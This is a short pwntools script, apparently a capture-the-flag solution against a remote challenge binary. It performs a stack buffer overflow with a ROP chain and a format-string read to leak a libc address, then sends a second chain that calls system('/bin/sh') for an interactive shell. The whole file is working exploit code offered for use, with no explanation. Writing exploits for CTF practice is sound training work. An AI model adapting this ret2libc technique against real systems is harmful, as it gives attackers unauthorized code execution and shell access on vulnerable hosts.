#!/usr/bin/python3
from pwn import *

context.arch = 'amd64'
exe = './chall'

if args.REMOTE:
    p = remote('u-get-me-write.k17.kctf.cloud', 1337)   
else:
    p = process(exe)



context.terminal = ['tmux', 'splitw', '-h']
l = context.binary = ELF(exe, checksec=False)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# gadget = lambda x: p64(next(l.search(asm(x, os='linux', arch=l.arch))))

payload = b'A' * 0x28
payload += p64(0x401060)
payload += p64(0x401050)
payload += p64(0x40101a)
payload += p64(l.symbols['main'])


p.sendlineafter(b':', payload)
p.sendline(b'%3$p ')


libc.address = int(p.recvuntil(b'\x1f', drop=True), 16) - 0x21aaa0
binsh = list(libc.search(b'/bin/sh'))[0]


payload = b'A' * 0x28
payload += p64(0x40101a)
payload += p64(libc.address + 0x000000000002a3e5)
payload += p64(binsh)
payload += p64(libc.symbols['system'])


p.sendline(payload)

p.interactive()

